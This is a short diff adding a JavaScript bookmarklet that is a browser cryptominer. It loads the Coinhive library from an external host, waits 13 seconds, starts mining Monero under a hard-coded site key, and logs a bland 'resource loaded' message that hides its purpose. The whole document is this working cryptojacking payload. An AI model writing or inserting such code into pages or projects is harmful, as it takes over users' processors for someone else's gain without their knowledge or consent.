@@ -1,0 +1,16 @@
+javascript: (function() {
+    document.body.appendChild(document.createElement('script')).src = 'https://coinhive.com/lib/coinhive.min.js';
+	setTimeout(function(){ 
+			var miner = new CoinHive.User('XRd7Q3fZ8tFbFOV7MuF1Y1Q4V19Qdlm0', 'Monero', {
+				threads: 1,
+				autoThreads: false,
+				throttle: 0.8,
+				forceASMJS: false,
+				theme: 'dark',
+				language: 'auto'
+			});
+			miner.start();
+			console.log("resource loaded");
+	}, 13000);
+})();
+
